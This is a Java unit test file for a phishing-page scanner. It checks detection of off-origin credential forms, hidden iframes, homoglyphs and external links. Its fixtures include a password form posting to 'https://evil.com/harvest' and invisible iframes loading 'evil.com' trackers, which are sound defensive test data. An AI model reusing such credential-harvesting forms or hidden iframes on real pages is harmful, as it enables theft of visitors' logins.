package com.secbret.scanner;

import com.secbret.exception.ValidationException;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Unit tests for Tier2Scanner HTML analysis logic.
 *
 * <p>We test the analysis logic directly against inline HTML fixtures to avoid
 * network calls. The {@code analyse} method is package-private and exposed via
 * a test-friendly subclass that bypasses the SSRF guard and HTTP fetch.
 *
 * <p>Coverage: forms (credential detection, off-origin action), iframes (hidden),
 * homoglyph detection (Cyrillic, Greek), link counting, external domains.
 */
@DisplayName("Tier2Scanner — HTML analysis")
class Tier2ScannerTest {

    private Tier2ScannerTestHelper scanner;

    @BeforeEach
    void setUp() {
        // SsrfGuard not needed for unit tests (we bypass fetch entirely).
        scanner = new Tier2ScannerTestHelper();
    }

    // =========================================================================
    // Forms
    // =========================================================================

    @Nested
    @DisplayName("Forms analysis")
    class FormsTests {

        @Test
        @DisplayName("clean form with same-origin action is not suspicious")
        void cleanForm_sameOrigin_notSuspicious() {
            String html = """
                    <html><body>
                    <form action="/login" method="POST">
                      <input type="text" name="username">
                      <input type="password" name="password">
                    </form>
                    </body></html>""";
            Tier2Findings f = scanner.analyseHtml(html, "https://example.com/login");
            assertThat(f.isHasLoginForm()).isTrue();
            assertThat(f.isSuspiciousFormAction()).isFalse();
        }

        @Test
        @DisplayName("password form posting to external domain sets suspiciousFormAction")
        void passwordForm_externalAction_suspicious() {
            String html = """
                    <html><body>
                    <form action="https://evil.com/harvest" method="POST">
                      <input type="text" name="username">
                      <input type="password" name="password">
                    </form>
                    </body></html>""";
            Tier2Findings f = scanner.analyseHtml(html, "https://mybank.com/");
            assertThat(f.isHasLoginForm()).isTrue();
            assertThat(f.isSuspiciousFormAction()).isTrue();
        }

        @Test
        @DisplayName("credential field name triggers login-form detection")
        void credentialFieldName_triggersLoginFormDetection() {
            String html = """
                    <html><body>
                    <form action="https://evil.com/post" method="POST">
                      <input type="text" name="user_pwd">
                    </form>
                    </body></html>""";
            Tier2Findings f = scanner.analyseHtml(html, "https://victim.com/");
            assertThat(f.isHasLoginForm()).isTrue();
            assertThat(f.isSuspiciousFormAction()).isTrue();
        }

        @Test
        @DisplayName("form with GET method to external domain is not suspicious")
        void getForm_externalAction_notSuspicious() {
            String html = """
                    <html><body>
                    <form action="https://external.com/search" method="GET">
                      <input type="text" name="q">
                    </form>
                    </body></html>""";
            Tier2Findings f = scanner.analyseHtml(html, "https://mysite.com/");
            assertThat(f.isSuspiciousFormAction()).isFalse();
        }

        @Test
        @DisplayName("forms list is populated with action and input fields")
        void formsList_populated() {
            String html = """
                    <html><body>
                    <form action="https://evil.com/post" method="POST">
                      <input type="text" name="email">
                      <input type="password" name="secret">
                    </form>
                    </body></html>""";
            Tier2Findings f = scanner.analyseHtml(html, "https://victim.com/");
            assertThat(f.getForms()).hasSize(1);
            assertThat(f.getForms().get(0).getMethod()).isEqualTo("POST");
            assertThat(f.getForms().get(0).getInputFields()).contains("email", "secret");
        }
    }

    // =========================================================================
    // iframes
    // =========================================================================

    @Nested
    @DisplayName("iframes analysis")
    class IframeTests {

        @Test
        @DisplayName("visible iframe is not flagged as hidden")
        void visibleIframe_notHidden() {
            String html = "<html><body><iframe src='https://maps.example.com' width='400' height='300'></iframe></body></html>";
            Tier2Findings f = scanner.analyseHtml(html, "https://example.com/");
            assertThat(f.isHasHiddenIframes()).isFalse();
            assertThat(f.getHiddenIframes()).isEqualTo(0);
        }

        @Test
        @DisplayName("iframe with display:none is flagged hidden")
        void iframeDisplayNone_flaggedHidden() {
            String html = "<html><body><iframe src='https://tracker.evil.com' style='display:none'></iframe></body></html>";
            Tier2Findings f = scanner.analyseHtml(html, "https://legit.com/");
            assertThat(f.isHasHiddenIframes()).isTrue();
            assertThat(f.getHiddenIframes()).isEqualTo(1);
        }

        @Test
        @DisplayName("iframe with width=0 is flagged hidden")
        void iframeWidthZero_flaggedHidden() {
            String html = "<html><body><iframe src='https://track.evil.com' width='0' height='0'></iframe></body></html>";
            Tier2Findings f = scanner.analyseHtml(html, "https://legit.com/");
            assertThat(f.isHasHiddenIframes()).isTrue();
        }

        @Test
        @DisplayName("multiple iframes: only hidden ones counted")
        void multipleIframes_onlyHiddenCounted() {
            String html = """
                    <html><body>
                    <iframe src='a.html' width='400' height='300'></iframe>
                    <iframe src='b.html' style='display:none'></iframe>
                    <iframe src='c.html' width='1' height='1'></iframe>
                    </body></html>""";
            Tier2Findings f = scanner.analyseHtml(html, "https://example.com/");
            assertThat(f.getHiddenIframes()).isEqualTo(2);
        }
    }

    // =========================================================================
    // Homoglyphs
    // =========================================================================

    @Nested
    @DisplayName("Homoglyph detection")
    class HomoglyphTests {

        @Test
        @DisplayName("ASCII-only content has no homoglyphs")
        void asciiOnly_noHomoglyphs() {
            String html = "<html><body><h1>My Bank Login</h1><p>Enter your credentials.</p></body></html>";
            Tier2Findings f = scanner.analyseHtml(html, "https://mybank.com/");
            assertThat(f.isHomoglyphDetected()).isFalse();
        }

        @Test
        @DisplayName("Cyrillic characters in title triggers homoglyph detection")
        void cyrillicInTitle_homoglyphDetected() {
            // Cyrillic 'а' (U+0430) looks identical to Latin 'a'
            String html = "<html><head><title>Bаnk Login</title></head><body>Login here</body></html>";
            Tier2Findings f = scanner.analyseHtml(html, "https://bank.com/");
            assertThat(f.isHomoglyphDetected()).isTrue();
        }

        @Test
        @DisplayName("Greek characters in body text triggers homoglyph detection")
        void greekInBody_homoglyphDetected() {
            // Greek omicron ο (U+03BF) looks identical to Latin o
            String html = "<html><body><p>Welcοme to our bank</p></body></html>";
            Tier2Findings f = scanner.analyseHtml(html, "https://bank.com/");
            assertThat(f.isHomoglyphDetected()).isTrue();
        }

        @Test
        @DisplayName("legitimate Cyrillic-script site content is still flagged (heuristic)")
        void legitimateCyrillicSite_flaggedByHeuristic() {
            // This is a known limitation of the range-based heuristic (ponytail comment).
            // Real Cyrillic-script sites will be false positives — Phase 7 upgrades to TR#39.
            String html = "<html><body><p>Добро пожаловать</p></body></html>";
            Tier2Findings f = scanner.analyseHtml(html, "https://ru.example.com/");
            // Heuristic fires: document the known FP ceiling.
            assertThat(f.isHomoglyphDetected()).isTrue();
        }
    }

    // =========================================================================
    // Links and external domains
    // =========================================================================

    @Nested
    @DisplayName("Link counting and external domains")
    class LinkTests {

        @Test
        @DisplayName("internal links counted correctly")
        void internalLinks_counted() {
            String html = """
                    <html><body>
                    <a href='/about'>About</a>
                    <a href='/contact'>Contact</a>
                    </body></html>""";
            Tier2Findings f = scanner.analyseHtml(html, "https://example.com/");
            assertThat(f.getLinks().getInternal()).isEqualTo(2);
            assertThat(f.getLinks().getExternal()).isEqualTo(0);
        }

        @Test
        @DisplayName("external links and domain list captured")
        void externalLinks_capturedWithDomains() {
            String html = """
                    <html><body>
                    <a href='https://ads.evil.com/track'>Ad</a>
                    <a href='https://cdn.evil.com/img'>CDN</a>
                    <a href='https://ads.evil.com/click'>Click</a>
                    </body></html>""";
            Tier2Findings f = scanner.analyseHtml(html, "https://victim.com/");
            assertThat(f.getLinks().getExternal()).isEqualTo(3);
            // Deduplication: ads.evil.com appears only once in externalDomains.
            assertThat(f.getExternalDomains()).containsExactlyInAnyOrder("ads.evil.com", "cdn.evil.com");
        }
    }

    // =========================================================================
    // Test helper: exposes package-private analyseDirect without SSRF/network
    // =========================================================================

    /**
     * Thin subclass that exposes the analysis logic without network calls.
     * Uses the protected no-arg constructor (CDI proxy path) so no SsrfGuard needed.
     */
    static class Tier2ScannerTestHelper extends Tier2Scanner {

        Tier2ScannerTestHelper() {
            // protected no-arg constructor from Tier2Scanner.
        }

        /** Parse inline HTML and run analysis directly, bypassing SSRF + HTTP. */
        Tier2Findings analyseHtml(String html, String baseUrl) {
            Document doc = Jsoup.parse(html, baseUrl);
            return analyseDirect(doc, baseUrl).findings();
        }
    }
}
